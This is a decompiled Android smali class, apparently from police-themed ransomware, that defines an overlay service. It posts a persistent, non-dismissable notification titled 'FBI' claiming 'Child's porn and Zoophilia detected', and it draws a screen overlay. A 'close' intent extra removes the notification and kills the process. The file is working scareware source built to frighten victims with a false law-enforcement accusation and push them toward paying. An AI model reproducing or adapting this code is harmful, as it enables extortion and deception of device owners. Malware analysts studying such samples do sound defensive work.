.class public Lbi/gemolay/sntareson/OverlayService;
.super Landroid/app/Service;
.source "OverlayService.java"


# instance fields
.field protected cancelNotification:Z

.field protected foreground:Z

.field protected id:I

.field private instance:Lbi/gemolay/sntareson/OverlayService;

.field private overlayView:Lbi/gemolay/sntareson/OverlayView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 27
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 29
    iput-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->foreground:Z

    .line 30
    iput-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->cancelNotification:Z

    .line 31
    iput v0, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    .line 27
    return-void
.end method


# virtual methods
.method protected foregroundNotification(I)Landroid/app/Notification;
    .locals 5
    .param p1, "notificationId"    # I

    .prologue
    .line 41
    new-instance v0, Landroid/app/Notification;

    const/high16 v1, 0x7f020000

    const-string v2, "FBI"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 43
    .local v0, "notification":Landroid/app/Notification;
    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x2

    or-int/lit8 v1, v1, 0x8

    iput v1, v0, Landroid/app/Notification;->flags:I

    .line 45
    const-string v1, "FBI"

    const-string v2, "Child\u2019s porn and Zoophilia detected"

    const/4 v3, 0x0

    invoke-virtual {v0, p0, v1, v2, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 47
    return-object v0
.end method

.method public moveToBackground(I)V
    .locals 1
    .param p1, "id"    # I

    .prologue
    .line 75
    iget-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->cancelNotification:Z

    invoke-virtual {p0, p1, v0}, Lbi/gemolay/sntareson/OverlayService;->moveToBackground(IZ)V

    .line 76
    return-void
.end method

.method public moveToBackground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 69
    const/4 v0, 0x0

    iput-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->foreground:Z

    .line 70
    const/4 p1, 0x0

    .line 71
    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    .line 72
    return-void
.end method

.method public moveToForeground(ILandroid/app/Notification;Z)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "notification"    # Landroid/app/Notification;
    .param p3, "cancelNotification"    # Z

    .prologue
    .line 55
    iget-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->foreground:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    .line 56
    const/4 v0, 0x1

    iput-boolean v0, p0, Lbi/gemolay/sntareson/OverlayService;->foreground:Z

    .line 57
    iput p1, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    .line 58
    iput-boolean p3, p0, Lbi/gemolay/sntareson/OverlayService;->cancelNotification:Z

    .line 60
    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 65
    :cond_0
    :goto_0
    return-void

    .line 61
    :cond_1
    iget v0, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    .line 62
    iput p1, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    .line 63
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lbi/gemolay/sntareson/OverlayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public moveToForeground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 51
    invoke-virtual {p0, p1}, Lbi/gemolay/sntareson/OverlayService;->foregroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Lbi/gemolay/sntareson/OverlayService;->moveToForeground(ILandroid/app/Notification;Z)V

    .line 52
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 114
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 105
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 107
    iput-object p0, p0, Lbi/gemolay/sntareson/OverlayService;->instance:Lbi/gemolay/sntareson/OverlayService;

    .line 109
    new-instance v0, Lbi/gemolay/sntareson/OverlayView;

    invoke-direct {v0, p0}, Lbi/gemolay/sntareson/OverlayView;-><init>(Lbi/gemolay/sntareson/OverlayService;)V

    iput-object v0, p0, Lbi/gemolay/sntareson/OverlayService;->overlayView:Lbi/gemolay/sntareson/OverlayView;

    .line 110
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v4, 0x1

    .line 80
    const/4 v0, 0x0

    .line 81
    .local v0, "extras":Landroid/os/Bundle;
    if-eqz p1, :cond_0

    .line 82
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 84
    :cond_0
    if-eqz v0, :cond_1

    .line 88
    const-string v2, "close"

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 89
    .local v1, "value1":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 91
    iput-boolean v4, p0, Lbi/gemolay/sntareson/OverlayService;->cancelNotification:Z

    .line 92
    iget v2, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    invoke-virtual {p0, v2, v4}, Lbi/gemolay/sntareson/OverlayService;->moveToBackground(IZ)V

    .line 93
    const-string v2, "notification"

    invoke-virtual {p0, v2}, Lbi/gemolay/sntareson/OverlayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    iget v3, p0, Lbi/gemolay/sntareson/OverlayService;->id:I

    invoke-virtual {v2, v3}, Landroid/app/NotificationManager;->cancel(I)V

    .line 94
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    .line 98
    .end local v1    # "value1":Ljava/lang/String;
    :cond_1
    iget-object v2, p0, Lbi/gemolay/sntareson/OverlayService;->overlayView:Lbi/gemolay/sntareson/OverlayView;

    if-eqz v2, :cond_2

    .line 99
    iget-object v2, p0, Lbi/gemolay/sntareson/OverlayService;->overlayView:Lbi/gemolay/sntareson/OverlayView;

    invoke-virtual {v2}, Lbi/gemolay/sntareson/OverlayView;->refreshLayout()V

    .line 101
    :cond_2
    return v4
.end method
